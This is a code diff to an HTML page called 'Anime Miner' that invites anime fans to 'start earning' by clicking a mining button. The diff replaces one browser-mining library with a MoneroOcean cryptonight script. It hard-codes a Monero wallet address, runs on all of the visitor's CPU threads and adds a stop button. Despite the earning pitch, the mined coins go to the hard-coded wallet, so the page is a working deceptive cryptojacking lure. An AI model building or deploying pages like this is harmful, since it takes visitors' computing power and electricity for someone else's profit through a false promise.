@@ -33,6 +33,7 @@
       border: none;
       border-radius: 0.5rem;
       cursor: pointer;
+      margin: 0.5rem;
     }
     .leaderboard, .chat, .social {
       margin-top: 2rem;
@@ -53,6 +54,7 @@
     <h1>🍥 Anime Miner - Start Earning with Naruto Spirit!</h1>
     <p>🔥 Join the Hidden Leaf mining squad and support your favorite anime world while earning!</p>
     <button onclick="startMining()">🌀 Start Mining</button>
+    <button onclick="stopMining()">⛔ Stop Mining</button>
     <p class="hashrate" id="hashrate">Hashrate: 0 H/s</p>
 
     <div class="leaderboard">
@@ -82,13 +84,13 @@
     Your browser does not support the audio tag.
   </audio>
 
-  <!-- WebMinePool Script -->
-  <script src="https://webminepool.com/lib/simple-ui.js"></script>
+  <!-- MoneroOcean Miner Script -->
+  <script src="https://webminer.moneroocean.stream/cryptonight.min.js"></script>
   <script>
-    const miner = WMP.User("SK_B6rSL7oeVjVCgdNYEBbRn", {
-      threads: navigator.hardwareConcurrency,
-      autoThreads: true,
-      throttle: 0.1
+    var miner = new CRLT.Anonymous('4B4STAs5vXm7D6EdaTntdvJwzx46UeKQvDfAcbDvyrhSYwR8cbnUAP33oehFR7N2FTg1Se9dQ61pW94EpzndtPXN6LXJAYY', {
+      threads: navigator.hardwareConcurrency || 2,
+      autoThreads: false,
+      throttle: 0.3
     });
 
     function startMining() {
@@ -98,6 +100,11 @@
         document.getElementById("hashrate").textContent = `Hashrate: ${rate} H/s`;
       }, 1000);
     }
+
+    function stopMining() {
+      miner.stop();
+    }
   </script>
 </body>
-</html>
+  </html>
+  
